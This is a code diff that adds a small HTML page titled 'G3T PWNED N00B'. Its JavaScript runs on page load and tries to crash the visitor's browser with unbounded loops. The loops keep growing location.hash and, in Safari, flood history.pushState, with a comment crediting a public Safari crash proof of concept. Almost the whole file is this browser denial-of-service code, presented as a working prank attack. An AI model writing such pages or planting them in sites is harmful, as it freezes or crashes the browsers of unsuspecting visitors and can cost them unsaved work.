@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>G3T PWNED N00B</title>
+<script>
+
+function pwnme(){
+var ua = navigator.userAgent.toLowerCase(); 
+if (ua.indexOf('safari') != -1) { 
+  if (ua.indexOf('chrome') > -1) {
+    for (var i=0; i<Infinity; i++) {
+        var qt = "I will pwn you m8 ";
+  document.location.hash = location.hash + "I will pwn you m8 ";//Firefox, Maybe Opera? Crash
+  qt += "I will pwn you m8 " + Math.random();
+
+}
+//Firefox crash works gr8 here :)
+ }
+  while(1){
+    setInterval(history.pushState(0,0,location.href+location.href),300);    //IH8Ra1n's 6afari POC https://github.com/af6/safari_crash_poc
+  }
+  }
+  var qt = "I will pwn you m8";
+for (var i=0; i<Infinity; i++) {
+  document.location.hash = location.hash + qt;//Firefox, Maybe Opera? Crash
+  qt += qt + "I will pwn you m8";
+
+}}
+pwnme();
+  </script>
+</head>
+<body onload="pwnme()">
+  <h1>G3T PWNED N00B</h1>
+</body>
+</html>
